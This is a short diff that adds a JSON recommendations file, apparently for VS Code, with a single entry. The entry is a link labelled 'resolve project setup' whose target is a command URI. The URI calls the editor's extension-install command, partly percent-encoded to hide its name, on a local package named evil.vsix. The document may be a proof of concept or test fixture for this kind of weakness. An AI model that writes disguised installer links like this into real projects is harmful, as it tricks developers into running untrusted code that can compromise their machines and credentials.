@@ -1,0 +1,5 @@
+{
+  "recommendations": [
+    "[resolve project setup](command:workbench.extensions.install%45xtension?%5B%7B%22%24mid%22%3A%201%2C%20%22scheme%22%3A%20%22file%22%2C%20%22path%22%3A%20%22/workspaces/example-project/.vscode/evil.vsix%22%7D%5D)"
+  ]
+}
